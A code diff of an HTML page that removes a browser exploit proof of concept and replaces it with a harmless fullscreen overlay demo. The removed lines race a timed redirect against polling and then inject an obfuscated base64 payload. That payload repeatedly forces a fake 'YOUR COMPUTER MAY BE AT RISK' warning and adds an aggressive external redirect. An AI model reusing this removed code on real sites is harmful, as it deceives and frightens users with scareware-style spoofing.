@@ -2,103 +2,55 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Exploit PoC - Fullscreen Overlay</title>
+<title>Fullscreen Overlay Demo</title>
+
 <style>
-  body {
-    margin: 0;
-    padding: 0;
-    overflow: hidden; /* Mencegah scroll */
-  }
+html, body {
+  width: 100%;
+  height: 100%;
+  margin: 0;
+}
 
-  #overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0, 0, 0, 0.9); /* Warna overlay */
-    display: none; /* Default tidak ditampilkan */
-    z-index: 9999;
-    color: #fff;
-    text-align: center;
-    font-size: 24px;
-    padding: 20px;
-  }
+#overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
 
-  #overlay p {
-    margin-top: 20%;
-    font-size: 36px;
-    font-weight: bold;
-  }
+  background: rgba(0,0,0,0.95);
+  z-index: 999999;
 
-  #overlay button {
-    padding: 10px 20px;
-    font-size: 20px;
-    margin-top: 30px;
-    background-color: #ff0000;
-    color: #fff;
-    border: none;
-    cursor: pointer;
-  }
+  display: flex;
+  align-items: center;
+  justify-content: center;
 
-  #overlay button:hover {
-    background-color: #cc0000;
-  }
+  color: white;
+  font-size: 32px;
+  font-family: Arial, sans-serif;
+}
 </style>
 </head>
 
 <body>
 
-<button onclick="foo()">GO</button>
+<button onclick="show()">SHOW OVERLAY</button>
 
-<!-- Overlay Panel -->
-<div id="overlay">
-  <p>You're under control!</p>
-  <button onclick="closeOverlay()">Close</button>
+<div id="overlay" style="display:none;">
+  <div>
+    <p>FULLSCREEN OVERLAY</p>
+    <button onclick="hide()">Close</button>
+  </div>
 </div>
 
 <script>
-var w;
-var t;
-
-function foo(){
-    // Triggering the redirect and race
-    w = setTimeout(() => {
-        document.location = "http://www.google.com";  // Faster redirect after 1 second
-    }, 1000);
-
-    // Aggressive interval check at 10ms for faster response
-    t = setInterval(bar, 10);
+function show() {
+  document.getElementById('overlay').style.display = 'flex';
 }
 
-function bar() {
-    try {
-        w.location.href;  // Checking location change
-    } catch (e) {
-        clearInterval(t); // Stop checking once redirect is successful
-        // Injecting the payload as soon as the redirect is blocked
-        setTimeout(() => {
-            document.write(atob('PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uIChlKSB7CmUudGFyZ2V0LnNldEN1c3RvbVZhbGlkaXR5KCJXQVJOSU5HIVxuWU9VUiBDT01QVVRFUiBNQVkgQkUgQVQgUklTSyIpOwp9OwpzZXRJbnRlcnZhbCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JiYicpLmNsaWNrKCkiLDEwMDApOwp9Cjwvc2NyaXB0Pgo8Zm9ybT4KICAgIDxpbnB1dCBwbGFjZWhvbGRlcj0iYWFhIiByZXF1aXJlZCBpZD0iYWFhIiAvPgogICAgPGlucHV0IGlkPSdiYmInIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0Ij4KPC9mb3JtPg=='));
-            test();
-        }, 1);  // Inject payload after 0.5 seconds
-    }
+function hide() {
+  document.getElementById('overlay').style.display = 'none';
 }
-
-// Function to close the overlay
-function closeOverlay() {
-    document.getElementById('overlay').style.display = 'none';  // Hide overlay
-}
-
-window.addEventListener('pageshow', () => {
-    requestAnimationFrame(() => {
-        requestAnimationFrame(() => {
-            setTimeout(() => {
-                // Immediately redirect to an external address (super fast)
-                location.href = 'https://google.com:9090';  // Aggressive redirect
-            }, 100);  // 100ms delay for quicker timing
-        });
-    });
-});
 </script>
 
 </body>
